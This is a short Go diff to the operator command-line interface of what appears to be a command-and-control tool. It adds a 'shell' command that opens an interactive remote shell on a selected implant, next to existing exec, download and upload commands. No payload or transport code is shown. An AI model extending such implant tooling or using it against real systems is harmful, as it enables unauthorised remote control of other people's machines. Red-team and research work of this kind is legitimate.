@@ -48,6 +48,7 @@ func (o *Operator) RunCLI() {
 			fmt.Println("  ls <path>         — list directory")
 			fmt.Println("  cd <path>         — change directory")
 			fmt.Println("  pwd               — print working directory")
+			fmt.Println("  shell             — interactive shell (direct stream)")
 			fmt.Println("  exec <cmd> [args] — execute command (with output)")
 			fmt.Println("  download <path>   — download file from implant")
 			fmt.Println("  upload <src> <dst> — upload file to implant")
@@ -134,6 +135,16 @@ func (o *Operator) RunCLI() {
 				fmt.Printf("error: %v\n", err)
 			} else {
 				fmt.Println("command sent")
+			}
+
+		case "shell":
+			if selected == nil {
+				fmt.Println("no implant selected (use 'select <idx>')")
+				continue
+			}
+			fmt.Printf("opening shell to %s@%s...\n", selected.Name, selected.Hostname)
+			if err := o.OpenShell(selected.PeerID); err != nil {
+				fmt.Printf("shell error: %v\n", err)
 			}
 
 		case "download":
